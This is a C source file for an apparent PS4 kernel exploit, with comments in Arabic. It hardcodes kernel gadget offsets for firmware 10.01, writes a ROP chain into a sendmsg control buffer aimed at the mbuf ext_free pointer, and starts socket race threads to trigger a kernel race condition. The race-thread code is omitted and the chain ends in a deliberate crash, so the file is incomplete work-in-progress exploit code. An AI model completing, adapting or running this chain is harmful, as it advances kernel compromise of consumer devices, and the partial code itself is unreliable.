#include <ps4.h>

// الإزاحات لنسخة 10.01 
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
#define OFF_POP_RAX_RET          0x09974F
#define OFF_RET                  0x0008E0

struct msghdr {
    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
    void *msg_control; uint32_t msg_controllen; int msg_flags;
};
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

#define CONTROL_LEN 256
uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;
int global_sock;

void build_perfect_chain(uint64_t kbase) {
    memset(control_buf, 0, CONTROL_LEN);
    
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = 7; 
    cmsg->cmsg_len = 0x50;

    uint64_t gadget1 = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint64_t pop_rax = kbase + OFF_POP_RAX_RET;
    uintptr_t val    = 0xDEADC0DE;

    // سنضع السلسلة في إزاحات مختلفة لضمان أن الـ Stack Pivot يجدها
    // الإزاحة 0x48 هي المكان التقليدي لـ ext_free في mbuf
    for (int i = 0x48; i < CONTROL_LEN - 32; i += 8) {
        uint64_t *rop = (uint64_t *)(control_buf + i);
        
        rop[0] = gadget1;    // الدخول: تضع 3ee6 في RBP وتدفع RSP لـ RSI
        rop[1] = pop_rax;    // الخطوة التالية: سحب القيمة لـ RAX
        rop[2] = val;        // القيمة التي نريد رؤيتها
        rop[3] = 0;          // إنهاء بكراش (RIP: 0)
    }
}

// ... بقية خيوط (Threads) السباق كما هي في الكود السابق ...

int _main(struct thread *td) {
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    build_perfect_chain(kbase);

    global_sock = syscall(97, 2, 2, 0);
    
    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);
    
    return 0;
}
